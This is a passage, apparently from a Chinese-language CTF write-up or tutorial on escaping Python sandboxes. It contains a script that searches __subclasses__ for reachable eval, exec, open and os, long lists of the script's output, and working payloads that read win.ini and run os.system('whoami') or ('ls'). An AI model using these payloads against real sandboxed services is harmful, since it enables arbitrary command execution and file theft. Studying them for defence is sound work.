&#39;sys&#39;] target_functions &#x3D; [&#39;__import__&#39;, &#39;__builtins__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;file&#39;, &#39;open&#39;] all_targets &#x3D; list(set(list(find_modules.keys()) + target_modules + target_functions)) all_modules &#x3D; list(set(list(find_modules.keys()) + target_modules)) subclasses &#x3D; ().__class__.__bases__[0].__subclasses__() sub_name &#x3D; [s.__name__ for s in subclasses] # 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#39;.&#x2F;test.py&#39;).read() print(&#39;----------1-----------&#39;) for i, s in enumerate(sub_name): for f in all_targets: if f &#x3D;&#x3D; s: if f in target_functions: print(i, f) elif f in all_modules: target &#x3D; find_modules[f] sub_dict &#x3D; subclasses[i].__dict__ for t in target: if t in sub_dict: print(i, f, target) print(&#39;----------2-----------&#39;) # 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;) for i, sub in enumerate(subclasses): try: more &#x3D; sub.__init__.__globals__ for m in all_targets: if m in more: print(i, sub, m, find_modules.get(m)) except Exception as e: pass print(&#39;----------3-----------&#39;) # 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;) for i, sub in enumerate(subclasses): try: more &#x3D; sub.__init__.__globals__.values() for j, v in enumerate(more): for f in all_targets: try: if f in v: if f in target_functions: print(i, j, sub, f) elif f in all_modules: target &#x3D; find_modules.get(f) sub_dict &#x3D; v[f].__dict__ for t in target: if t in sub_dict: print(i, j, sub, f, target) except Exception as e: pass except Exception as e: pass print(&#39;----------4-----------&#39;) # 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;) # &lt;class &#39;warnings.catch_warnings&#39;&gt;类很特殊，在内部定义了_module&#x3D;sys.modules[&#39;warnings&#39;]，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似 for i, sub in enumerate(subclasses): try: more &#x3D; sub()._module.__builtins__ for f in all_targets: if f in more: print(i, f) except Exception as e: pass ----------2----------- 75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __builtins__ None 75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__ None 75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; sys None 76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __builtins__ None 76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__ None 76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; sys None 77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __builtins__ None 77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__ None 77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; sys None 78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __builtins__ None 78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__ None 78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; sys None 79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __builtins__ None 79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__ None 79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; sys None 91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __builtins__ None 91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; sys None 92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __builtins__ None 92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; sys None 93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __builtins__ None 93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; sys None 95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __builtins__ None 95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; sys None 103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __builtins__ None 103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; sys None 103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None 104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __builtins__ None 104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; sys None 104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None 105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __builtins__ None 105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; sys None 105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None 106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __builtins__ None 106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; sys None 106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None 128 &lt;class &#39;os._wrap_close&#39;&gt; __builtins__ None 128 &lt;class &#39;os._wrap_close&#39;&gt; sys None 128 &lt;class &#39;os._wrap_close&#39;&gt; open None 129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __builtins__ None 129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; sys None 130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __builtins__ None 130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; sys None 137 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __builtins__ None 138 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __builtins__ None 139 &lt;class &#39;warnings.WarningMessage&#39;&gt; __builtins__ None 139 &lt;class &#39;warnings.WarningMessage&#39;&gt; sys None 140 &lt;class &#39;warnings.catch_warnings&#39;&gt; __builtins__ None 140 &lt;class &#39;warnings.catch_warnings&#39;&gt; sys None 167 &lt;class &#39;reprlib.Repr&#39;&gt; __builtins__ None 174 &lt;class &#39;functools.partialmethod&#39;&gt; __builtins__ None 176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __builtins__ None 176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; sys None 177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __builtins__ None 177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; sys None ----------3----------- 75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec 75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; eval 75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; compile 75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__ 75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open 76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec 76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; eval 76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; compile 76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__ 76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open 77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec 77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; eval 77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; compile 77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__ 77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open 78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec 78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; eval 78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; compile 78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__ 78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open 79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec 79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; eval 79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; compile 79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__ 79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open 91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec 91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; eval 91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; compile 91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __import__ 91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open 92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec 92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; eval 92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; compile 92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __import__ 92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open 93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec 93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; eval 93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; compile 93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __import__ 93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open 95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec 95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; eval 95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; compile 95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __import__ 95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open 103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec 103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; eval 103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; compile 103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __import__ 103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open 103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open 104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec 104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; eval 104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; compile 104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __import__ 104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open 104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open 105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec 105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; eval 105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; compile 105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __import__ 105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open 105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open 106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec 106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; eval 106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; compile 106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __import__ 106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open 106 56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open 128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec 128 1 &lt;class &#39;os._wrap_close&#39;&gt; file 128 1 &lt;class &#39;os._wrap_close&#39;&gt; open 128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec 128 7 &lt;class &#39;os._wrap_close&#39;&gt; eval 128 7 &lt;class &#39;os._wrap_close&#39;&gt; compile 128 7 &lt;class &#39;os._wrap_close&#39;&gt; __import__ 128 7 &lt;class &#39;os._wrap_close&#39;&gt; open 128 11 &lt;class &#39;os._wrap_close&#39;&gt; open 129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec 129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; eval 129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; compile 129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __import__ 129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open 130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec 130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; eval 130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; compile 130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __import__ 130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open 137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec 137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; eval 137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; compile 137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __import__ 137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open 138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec 138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; eval 138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; compile 138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __import__ 138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open 139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec 139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; eval 139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; compile 139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; __import__ 139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open 140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec 140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; eval 140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; compile 140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; __import__ 140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open 167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec 167 7 &lt;class &#39;reprlib.Repr&#39;&gt; eval 167 7 &lt;class &#39;reprlib.Repr&#39;&gt; compile 167 7 &lt;class &#39;reprlib.Repr&#39;&gt; __import__ 167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open 174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec 174 7 &lt;class &#39;functools.partialmethod&#39;&gt; eval 174 7 &lt;class &#39;functools.partialmethod&#39;&gt; compile 174 7 &lt;class &#39;functools.partialmethod&#39;&gt; __import__ 174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open 176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec 176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; eval 176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; compile 176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __import__ 176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open 177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec 177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; eval 177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; compile 177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __import__ 177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open ----------4----------- 140 exec 140 eval 140 compile 140 __import__ 140 open 筛选出来的模块还是很多，每个分块中，不用的部分代表利用不同的方式，为了更方便的利用进一步筛选具有更直接利用方式的类，关注再命令执行和读写上 ----------2----------- 103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None 104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None 105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None 106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None 128 &lt;class &#39;os._wrap_close&#39;&gt; open None ----------3----------- 75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open 75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec 76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open 76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec 77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open 77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec 78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open 78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec 79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open 79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec 91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open 91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec 92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open 92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec 93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open 93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec 95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open 95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec 103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open 103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec 103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open 104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open 104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec 104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open 105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open 105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec 105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open 106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open 106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec 106 56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open 128 1 &lt;class &#39;os._wrap_close&#39;&gt; open 128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec 128 7 &lt;class &#39;os._wrap_close&#39;&gt; open 128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec 128 11 &lt;class &#39;os._wrap_close&#39;&gt; open 129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open 129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec 130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open 130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec 137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open 137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec 138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open 138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec 139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open 139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec 140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open 140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec 167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open 167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec 174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open 174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec 176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open 176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec 177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open 177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec ----------4----------- 140 open 140 exec 既然筛选出来，那么选其中一个利用来读取文件： &gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103] &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; 完整执行 &gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#39;open&#39;](&quot;C:\\\\windows\\\\win.ini&quot;).read() &#39;; for 16-bit app support\\n[fonts]\\n[extensions]\\n[mci extensions]\\n[files]\\n[Mail]\\nMAPI&#x3D;1\\nCMCDLLNAME32&#x3D;mapi32.dll\\nCM C&#x3D;1\\nMAPIX&#x3D;1\\nMAPIXVER&#x3D;1.0.0.1\\nOLEMessaging&#x3D;1\\n[xianshuabao]\\nclient_uuid&#x3D;&#123;xxx&#125;\\n&#39; 执行命令，此处如果使用原作者给的第三种利用代码在python3中会报错，python3中对于dict.values不再返回列表，而是返回view，不可索引的对象。 &gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;) misaki\\user python2python2.7的模块(252) bsddb compiler ctypes curses ...... webbrowser.py whichdb.py wsgiref.egg-info xdrlib.py xmllib.py xmlrpclib.py zipfile.py 同样利用原代码进行筛选 ----------1----------- (40, &#39;file&#39;) ----------2----------- (59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;]) (59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;__builtins__&#39;, None) (59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;sys&#39;, None) (59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;]) (60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;]) (60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__builtins__&#39;, None) (60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;sys&#39;, None) (60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;]) (61, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__builtins__&#39;, None) (62, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__builtins__&#39;, None) (72, &lt;class &#39;site._Printer&#39;&gt;, &#39;__builtins__&#39;, None) (72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;]) (72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;]) (72, &lt;class &#39;site._Printer&#39;&gt;, &#39;sys&#39;, None) (77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__builtins__&#39;, None) (77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;]) (77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;]) (77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;sys&#39;, None) (78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;__builtins__&#39;, None) (78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;sys&#39;, None) (78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None) (79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__builtins__&#39;, None) (79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;sys&#39;, None) (79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None) ----------3----------- (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;__import__&#39;) (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;) (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;compile&#39;) (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;) (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;) (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;) (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__import__&#39;) (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;) (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;compile&#39;) (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;) (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;) (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;) (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__import__&#39;) (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;) (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;compile&#39;) (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;) (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;) (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;) (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__import__&#39;) (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;) (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;compile&#39;) (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;) (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;) (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;) (72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;) (72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;) (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;__import__&#39;) (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;) (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;compile&#39;) (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;) (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;) (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;) (77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;) (77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;) (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__import__&#39;) (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;) (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;compile&#39;) (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;) (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;) (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;) (78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;) (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;__import__&#39;) (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;) (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;compile&#39;) (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;) (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;) (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;) (79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;) (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__import__&#39;) (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;) (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;compile&#39;) (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;) (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;) (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;) ----------4----------- (60, &#39;__import__&#39;) (60, &#39;file&#39;) (60, &#39;repr&#39;) (60, &#39;compile&#39;) (60, &#39;eval&#39;) (60, &#39;open&#39;) (60, &#39;execfile&#39;) 进一步获取可以直接执行命令或者读取文件的类 ----------1----------- (40, &#39;file&#39;) ----------2----------- (59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;]) (59, &lt;class 